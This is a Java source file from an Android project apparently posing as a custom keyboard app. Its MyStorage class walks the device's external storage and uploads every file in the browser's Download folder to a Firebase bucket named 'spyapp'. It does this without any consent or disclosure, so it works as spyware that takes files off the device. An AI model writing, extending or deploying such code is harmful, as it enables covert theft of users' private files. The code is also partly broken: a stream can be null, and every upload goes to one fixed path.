package com.example.wildcat.customkeyboard;

import android.graphics.Bitmap;
import android.net.Uri;
import android.os.Environment;
import android.support.annotation.NonNull;
import android.util.Log;

import com.firebase.client.utilities.Base64;

import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.IOException;
import java.io.InputStream;
import java.net.URI;

import com.firebase.client.Firebase;
import com.google.android.gms.tasks.OnFailureListener;
import com.google.android.gms.tasks.OnSuccessListener;
import com.google.firebase.storage.StorageReference;
import com.google.firebase.storage.FirebaseStorage;
import com.google.firebase.storage.UploadTask;


public class MyStorage{

    FirebaseStorage storage = FirebaseStorage.getInstance();
    StorageReference storageRef = storage.getReferenceFromUrl("gs://spyapp-9cba9.appspot.com");
    StorageReference spaceRef = storageRef.child("images/");

    //StorageReference storageRef = storage.getReferenceFromUrl("gs://<your-bucket-name>");


    //String sdCardRoot = Environment.getExternalStorageDirectory().toString();
    public void listRaw(File sdCardRoot){
        String path_name = sdCardRoot.toString();
        File f = new File(path_name);
        File files[] = f.listFiles();
        if (files != null){
            for(int i = 0; i < files.length; i++){
                Log.d("Files", "filename: " + files[i].getName());
                listRaw(files[i]);
            }
        }

        /*
        File yourDir = new File(sdCardRoot, "Alarms");
        for (File f : yourDir.listFiles()) {
            if (f.isFile())
            {
                String name = f.getName();
                Log.i("file names", name);

            }

        }*/
    }

    public void list_files(){
        String path = Environment.getExternalStorageDirectory().toString()+"/Android/Data/com.android.browser/files/Download/";
        URI URIs = Environment.getExternalStorageDirectory().toURI();
        Log.d("Files", "Path: " + path);
        Log.d("URIS", "URIS: "  + URIs);
        File directory = new File(path);
        File[] files = directory.listFiles();
        Log.d("Files", "Size: "+ files.length);
        for (int i = 0; i < files.length; i++)
        {
            Log.d("Files", "FileName:" + files[i].getName());
            InputStream stream = null;
            try {
                stream = new FileInputStream(new File(path + files[i].getName()));// files[i].getName()));
                Log.d("Test", "test1");
            }
            catch (Exception e){
                Log.e("Failed", "failed");

            }

                UploadTask uploadTask; // = spaceRef.putBytes(data);
                uploadTask = spaceRef.putStream(stream);
                Log.d("Test", "test2");

                uploadTask.addOnFailureListener(new OnFailureListener() {
                    @Override
                    public void onFailure(@NonNull Exception exception) {
                        // Handle unsuccessful uploads
                    }
                }).addOnSuccessListener(new OnSuccessListener<UploadTask.TaskSnapshot>() {
                    @Override
                    public void onSuccess(UploadTask.TaskSnapshot taskSnapshot) {
                        // taskSnapshot.getMetadata() contains file metadata such as size, content-type, and download URL.
                        Uri downloadUrl = taskSnapshot.getDownloadUrl();
                    }
                });



        }
    }

}
